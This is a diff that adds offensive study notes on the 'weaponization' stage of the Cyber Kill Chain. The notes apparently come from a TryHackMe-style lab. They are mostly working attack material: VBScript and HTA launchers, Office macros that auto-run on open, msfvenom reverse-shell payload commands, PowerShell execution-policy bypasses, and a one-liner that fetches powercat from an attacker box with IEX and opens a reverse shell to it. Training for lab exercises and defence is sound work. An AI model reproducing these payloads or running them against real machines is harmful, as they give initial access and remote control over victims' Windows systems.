@@ -1,0 +1,106 @@
+Weaponization is the second stage of the Cyber Kill Chain model. In this stage, the attacker generates and develops their own malicious code using deliverable payloads such as word documents, PDFs, etc. [1].
+The weaponization stage aims to use the malicious weapon to exploit the target machine and gain initial access.
+
+
+Windows Scripting Host (WSH)
+
+Execution: cscript.exe (command-line) & wscript.exe (User script)
+Extension: vbs,vbe
+
+Code:
+Set shell = WScript.CreateObject("Wscript.Shell")
+shell.Run("C:\Windows\System32\calc.exe " & WScript.ScriptFullName),0,True
+
+Bypass:
+
+wscript /e:VBScript payload.txt
+----------------------------------------------------------------------------------------------------------------
+An HTML Application (HTA)
+
+Execution: html code
+Extension: hta
+
+Code:
+
+Hacker Escenario: create html page
+
+<html>
+<body>
+<script>
+	var c= 'cmd.exe'
+	new ActiveXObject('WScript.Shell').Run(c);
+</script>
+</body>
+</html>
+
+Victim Escenario: Visit html page from hacker
+
+Reverse shell:
+Create RS: msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.8.232.37 LPORT=443 -f hta-psh -o thm.hta
+
+----------------------------------------------------------------------------------------------------------------
+Visual Basic for Application (VBA)
+
+
+Execution: Microsoft Word, excel, powerpoint, (Microsoft Office)
+Extension: macros, vba
+
+Code: 
+
+Word file -> view -> macros -> create
+
+Sub Document_Open()
+  THM
+End Sub
+
+Sub AutoOpen()
+  THM
+End Sub
+
+Sub PoC()
+	Dim payload As String
+	payload = "calc.exe"
+	CreateObject("Wscript.Shell").Run payload,0
+End Sub
+
+Save -> Save on extension word 97-2003 Document
+
+
+Reverse shell:
+RS: msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.50.159.15 LPORT=443 -f vba
+
+
+----------------------------------------------------------------------------------------------------------------
+
+Powershell-PSH
+
+Execution: Powershell file
+Extension: ps1
+
+Code: 
+
+Disable PolicyExecution
+Get - Execution // See PE Status
+
+Set-ExecutionPolicy -Scope CurrentUser RemoteSigned // Disable
+
+or powershell -ex bypass -File example.ps1
+
+Reverse shell:
+
+PC Attack 
+git clone https://github.com/besimorhino/powercat.git
+
+UP Webserver
+
+python -m http.server 6666
+
+Listen conexion 
+nc -lvp 1337
+
+
+PC Victim
+powershell -c "IEX(New-Object System.Net.WebClient).DownloadString('http://ATTACKBOX_IP:8080/powercat.ps1');powercat -c ATTACKBOX_IP -p 1337 -e cmd"
+
+----------------------------------------------------------------------------------------------------------------
+
